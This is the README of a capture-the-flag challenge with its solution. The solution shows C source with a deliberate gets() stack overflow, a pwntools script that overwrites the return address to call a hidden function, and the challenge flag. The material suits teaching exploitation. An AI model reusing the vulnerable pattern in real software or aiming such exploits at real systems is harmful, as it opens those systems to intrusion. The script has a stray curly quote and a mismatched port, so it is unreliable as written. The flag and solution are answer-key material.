# Secret Function

Difficulty Level: Easy

Got one of these pointers that point. Point it in the right direction

Connect via `nc challenge.ctf-fun.xyz 14006`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- Use `objdump -t ./secretfunction` to show the memory location of the function
you can filter the results by piping it to `grep`
- Point return address to the win function



## Deployment

```bash
cd service
sudo ./secretfunction.sh &
```

## Solution
Looking at the source code we see there's a function `secret` that can't be called normally. We need to overwrite the return address to access that function.
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define FLAGSIZE 64

char flag[FLAGSIZE];

void secret(){
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
		printf("Flag File is Missing.\n");
		exit(0);
	}

	fgets(flag,FLAGSIZE,f);
	printf("%s\n", flag);
}


void vulnerable() {
	char buf[64] = {0x00};
	
	gets(buf);
	puts("Maybe you will find it next time");
	return;	
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);
	puts("Hidden in me is a function that leads you to the flag, can you find it?");
	vulnerable();
}
```

Find offset (76) using `gdb` then find location of secret function (0x080491b2) using `objdump`

```python
from pwn import *
 
def main():
    #io = process("./secretfunction")
    io = remote("challenge.ctf-fun.xyz", 14008‚Äù)
    secret = 0x080491b2
    payload = b"A" * 76 + p32(secret)
    io.sendline(payload)
    io.interactive()
if __name__ == '__main__':
    main()

```

### Flag
19C4{1m_h1dd3n_in_s3cret}